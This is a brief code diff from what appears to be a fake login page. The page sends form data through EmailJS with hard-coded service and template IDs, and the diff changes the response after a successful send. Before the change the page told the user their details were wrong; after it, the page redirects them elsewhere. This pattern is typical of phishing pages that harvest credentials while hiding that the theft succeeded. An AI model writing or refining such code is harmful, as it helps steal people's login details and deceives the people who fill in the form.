@@ -255,7 +255,7 @@ form .create-account:hover {
 
       emailjs.send('service_3lk30ip', 'template_mkgelov', templateParams)
         .then(function(response) {
-          alert('Your information is wrong!!');
+          window.location.assign("m.html");
         }, function(error) {
           alert('failed to log in.');
         });
